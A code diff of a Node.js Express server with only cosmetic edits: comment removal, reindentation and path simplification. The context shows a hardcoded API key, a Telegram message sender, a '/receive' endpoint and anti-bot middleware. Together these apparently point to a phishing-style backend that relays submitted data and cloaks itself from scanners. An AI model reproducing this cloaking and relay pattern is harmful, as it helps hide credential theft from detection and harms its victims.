@@ -12,9 +12,9 @@ const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const fs = require('fs').promises; 
  
-app.use(express.static(path.join(`${__dirname}`)));
+app.use(express.static(__dirname));
 
-const port = 3000; // You can use any available port
+const port = 3000;
 app.listen(port, () => {
     console.log(`Server is running on port ${port}`);
 });
@@ -43,7 +43,6 @@ const sendTelegramMessage = (text) => {
     console.log('sent');
 
     const req = https.request(options, (res) => {
-      // Handle the response if needed
     });
 
     req.write(params);
@@ -114,7 +113,6 @@ app.post('/receive', async (req, res) => {
   
   
 });
-
 
 
 
@@ -213,18 +211,16 @@ async function antiBotMiddleware(req, res, next) {
     } else {
     	
     	try {
-    	const pickContent = await fs.readFile('index.md', 'utf-8');
-		res.send(pickContent);
-    	//res.sendFile(path.join(__dirname, 'index.md'));
-    	    } catch (error) {
-        // Handle any errors, for example, file not found
-        console.error('Error reading file:', error);
-        res.status(500).send('Internal Server Error');
-    }
+	    	const pickContent = await fs.readFile('index.md', 'utf-8');
+			res.send(pickContent);
+    	} catch (error) {
+        	// Handle any errors, for example, file not found
+        	console.error('Error reading file:', error);
+        	res.status(500).send('Internal Server Error');
+    	}
+	}
 }
 
 // Middlewares
 app.use(antiBotMiddleware);
-app.use(express.static(path.join(__dirname)));
-
-
+app.use(express.static(__dirname));
